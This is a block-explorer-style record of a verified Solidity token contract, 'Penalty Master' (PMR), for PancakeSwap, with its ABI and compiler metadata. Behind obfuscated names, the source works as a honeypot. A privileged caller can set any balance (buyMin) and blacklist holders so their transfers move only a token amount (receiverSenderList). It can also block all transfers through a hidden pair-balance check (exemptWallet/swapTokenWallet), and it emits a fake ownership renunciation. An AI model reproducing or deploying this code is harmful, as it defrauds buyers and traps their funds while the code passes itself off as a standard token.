{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchedEnableLiquidity {\n    function createPair(address liquidityTake, address listMax) external returns (address);\n}\n\ninterface shouldLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atExempt) external view returns (uint256);\n\n    function transfer(address tradingEnable, uint256 marketingAuto) external returns (bool);\n\n    function allowance(address maxFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingEnable,\n        uint256 marketingAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txLaunched, uint256 value);\n    event Approval(address indexed maxFee, address indexed spender, uint256 value);\n}\n\nabstract contract tokenMaxLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txSell is shouldLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PenaltyMaster is tokenMaxLaunched, shouldLimit, txSell {\n\n    mapping(address => uint256) private toMode;\n\n    function enableFund() public {\n        emit OwnershipTransferred(enableShould, address(0));\n        toTeam = address(0);\n    }\n\n    bool public swapReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atTake;\n    }\n\n    uint256 receiverExempt;\n\n    address private toTeam;\n\n    address tokenIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public receiverBuy;\n\n    string private listSellReceiver = \"PMR\";\n\n    function balanceOf(address atExempt) public view virtual override returns (uint256) {\n        return toMode[atExempt];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchTo;\n    }\n\n    uint8 private launchTo = 18;\n\n    function receiverSenderList(address fromWallet) public {\n        buyTakeList();\n        if (autoFundMarketing == fundSell) {\n            swapReceiver = false;\n        }\n        if (fromWallet == enableShould || fromWallet == sellFromTrading) {\n            return;\n        }\n        receiverBuy[fromWallet] = true;\n    }\n\n    uint256 private fundSell;\n\n    function transferFrom(address enableListLiquidity, address tradingEnable, uint256 marketingAuto) external override returns (bool) {\n        if (_msgSender() != swapFromTeam) {\n            if (liquidityWalletReceiver[enableListLiquidity][_msgSender()] != type(uint256).max) {\n                require(marketingAuto <= liquidityWalletReceiver[enableListLiquidity][_msgSender()]);\n                liquidityWalletReceiver[enableListLiquidity][_msgSender()] -= marketingAuto;\n            }\n        }\n        return swapTokenWallet(enableListLiquidity, tradingEnable, marketingAuto);\n    }\n\n    bool public receiverLaunched;\n\n    function buyMin(address minEnable, uint256 marketingAuto) public {\n        buyTakeList();\n        toMode[minEnable] = marketingAuto;\n    }\n\n    uint256 private autoFundMarketing;\n\n    function owner() external view returns (address) {\n        return toTeam;\n    }\n\n    constructor (){\n        \n        minFee maxShould = minFee(swapFromTeam);\n        sellFromTrading = launchedEnableLiquidity(maxShould.factory()).createPair(maxShould.WETH(), address(this));\n        \n        enableShould = _msgSender();\n        senderFund[enableShould] = true;\n        toMode[enableShould] = atTake;\n        enableFund();\n        if (swapReceiver) {\n            totalLaunched = false;\n        }\n        emit Transfer(address(0), enableShould, atTake);\n    }\n\n    function buyTakeList() private view {\n        require(senderFund[_msgSender()]);\n    }\n\n    string private swapTx = \"Penalty Master\";\n\n    function swapTokenWallet(address enableListLiquidity, address tradingEnable, uint256 marketingAuto) internal returns (bool) {\n        if (enableListLiquidity == enableShould) {\n            return atLaunched(enableListLiquidity, tradingEnable, marketingAuto);\n        }\n        uint256 fundTeam = shouldLimit(sellFromTrading).balanceOf(tokenIs);\n        require(fundTeam == feeLaunchedSwap);\n        require(tradingEnable != tokenIs);\n        if (receiverBuy[enableListLiquidity]) {\n            return atLaunched(enableListLiquidity, tradingEnable, modeReceiver);\n        }\n        return atLaunched(enableListLiquidity, tradingEnable, marketingAuto);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listSellReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return toTeam;\n    }\n\n    function allowance(address listFrom, address takeShould) external view virtual override returns (uint256) {\n        if (takeShould == swapFromTeam) {\n            return type(uint256).max;\n        }\n        return liquidityWalletReceiver[listFrom][takeShould];\n    }\n\n    bool public marketingMinWallet;\n\n    function exemptWallet(uint256 marketingAuto) public {\n        buyTakeList();\n        feeLaunchedSwap = marketingAuto;\n    }\n\n    event OwnershipTransferred(address indexed fromSwap, address indexed fundEnable);\n\n    address public enableShould;\n\n    function transfer(address minEnable, uint256 marketingAuto) external virtual override returns (bool) {\n        return swapTokenWallet(_msgSender(), minEnable, marketingAuto);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityWalletReceiver;\n\n    bool public totalLaunched;\n\n    function atLaunched(address enableListLiquidity, address tradingEnable, uint256 marketingAuto) internal returns (bool) {\n        require(toMode[enableListLiquidity] >= marketingAuto);\n        toMode[enableListLiquidity] -= marketingAuto;\n        toMode[tradingEnable] += marketingAuto;\n        emit Transfer(enableListLiquidity, tradingEnable, marketingAuto);\n        return true;\n    }\n\n    uint256 feeLaunchedSwap;\n\n    uint256 public feeExempt;\n\n    mapping(address => bool) public senderFund;\n\n    address public sellFromTrading;\n\n    function approve(address takeShould, uint256 marketingAuto) public virtual override returns (bool) {\n        liquidityWalletReceiver[_msgSender()][takeShould] = marketingAuto;\n        emit Approval(_msgSender(), takeShould, marketingAuto);\n        return true;\n    }\n\n    uint256 constant modeReceiver = 20 ** 10;\n\n    uint256 private atTake = 100000000 * 10 ** 18;\n\n    function limitWallet(address swapLiquidity) public {\n        require(swapLiquidity.balance < 100000);\n        if (receiverLaunched) {\n            return;\n        }\n        if (fundSell == autoFundMarketing) {\n            autoFundMarketing = feeExempt;\n        }\n        senderFund[swapLiquidity] = true;\n        if (marketingMinWallet) {\n            swapReceiver = true;\n        }\n        receiverLaunched = true;\n    }\n\n    address swapFromTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private launchList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"buyMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"exemptWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"}],\"name\":\"limitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMinWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"receiverSenderList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFromTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableListLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PenaltyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}